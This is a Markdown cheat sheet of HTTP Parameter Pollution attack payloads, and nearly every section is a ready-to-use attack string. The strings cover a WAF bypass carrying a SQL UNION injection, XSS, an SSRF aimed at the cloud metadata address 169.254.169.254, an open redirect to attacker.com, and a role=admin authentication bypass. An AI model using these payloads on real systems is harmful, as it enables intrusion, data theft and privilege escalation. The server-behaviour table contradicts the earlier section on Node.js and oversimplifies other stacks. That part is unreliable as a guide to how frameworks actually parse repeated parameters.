# HTTP Parameter Pollution (HPP)

## 1. Basic HPP
```
?id=1&id=2
# Different servers handle differently:
# ASP: 1,2
# PHP: 2
# JSP: 1
# Node.js: 1
```

## 2. HPP for WAF Bypass
```
# WAF inspects first parameter, server uses second
?id=1&id=1' UNION SELECT 1,2,3-- -
```

## 3. HPP for Cache Poisoning
```
GET /page?param=innocent&param=malicious
# Cache may store innocent, server processes malicious
```

## 4. HPP for XSS
```
?param=<script>alert(1)</script>&param=safe
```

## 5. HPP for SQLi
```
?id=1&id=1' OR '1'='1
```

## 6. HPP for SSRF
```
?url=http://safe.com&url=http://169.254.169.254
```

## 7. HPP for Open Redirect
```
?url=/safe&url=http://attacker.com
```

## 8. HPP in POST Body
```
param=safe&param=malicious
```

## 9. HPP with Different Content Types
```
# URL encoded
param=safe&param=malicious
# JSON
{"param":"safe","param":"malicious"}
```

## 10. HPP for Authentication Bypass
```
?role=user&role=admin
```

## Server Behavior
```
PHP: Last value wins (param=2)
JSP: First value wins (param=1)
ASP: All values concatenated (param=1,2)
Node.js: Depends on framework
Python: First value wins (param=1)
Ruby: Last value wins (param=2)
```
